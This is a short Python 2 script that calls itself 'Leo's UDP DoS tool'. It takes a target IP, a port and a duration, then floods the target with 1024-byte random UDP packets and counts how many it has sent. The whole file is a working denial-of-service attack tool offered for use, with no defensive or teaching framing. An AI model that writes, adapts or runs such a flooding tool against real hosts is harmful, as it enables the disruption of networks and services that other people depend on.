#Created by LeoDaVinci
print "Welcome to Leo's UDP DoS tool! Please input your tagets IP, Port number (ex 80), and ammont of time in seconds for attack. "
import time
import socket
import random
 

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

def pres():
    print
pres()
victim  = raw_input('Enter your targets ip: ')
vport = input('Enter Port number: ')
duration  = input('Time for attack in seconds: ')
timeout =  time.time() + duration
sent = 0
 
while 1:
    if time.time() > timeout:
        break
    else:
        pass
    client.sendto(bytes, (victim, vport))
    sent = sent + 1
    print "%s sent packages, Hitting, %s on port, %s "%(sent, victim, vport)
